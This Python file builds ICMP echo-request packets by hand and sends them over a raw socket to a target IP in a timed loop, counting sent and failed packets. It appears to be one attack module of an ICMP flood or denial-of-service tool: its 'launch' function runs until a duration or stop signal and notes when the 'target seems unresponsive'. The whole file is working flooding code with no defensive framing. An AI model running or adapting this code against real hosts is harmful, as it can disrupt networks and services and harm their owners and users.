import socket
import os
import struct
import time

def checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        a = data[i]
        b = data[i+1] if i+1 < len(data) else 0
        s += (a << 8) + b
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def create_icmp_packet(seq):
    header = struct.pack("!BBHHH", 8, 0, 0, os.getpid() & 0xFFFF, seq)
    payload = b'A' * 56
    checksum_value = checksum(header + payload)
    header = struct.pack("!BBHHH", 8, 0, checksum_value, os.getpid() & 0xFFFF, seq)
    return header + payload

def launch(target_ip, port, duration, tag, stop_event, fail_tracker):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.settimeout(1)
    except PermissionError:
        print(f"[!] {tag} requires admin/root privileges.")
        fail_tracker['fail'] += 1  # update fail count in dict
        return

    sent = 0
    lost = 0
    seq = 0
    start_time = time.time()

    while not stop_event.is_set():
        if duration and (time.time() - start_time > duration):
            break

        packet = create_icmp_packet(seq)
        try:
            sock.sendto(packet, (target_ip, 0))
            sent += 1
            fail_tracker['sent'] += 1   # increment sent count in dict
        except Exception:
            lost += 1
            fail_tracker['fail'] += 1  # increment fail count in dict

        if lost > 20:
            print(f"[x] {tag} target seems unresponsive. Stopping.")
            break

        seq += 1
        time.sleep(0.01)

    sock.close()
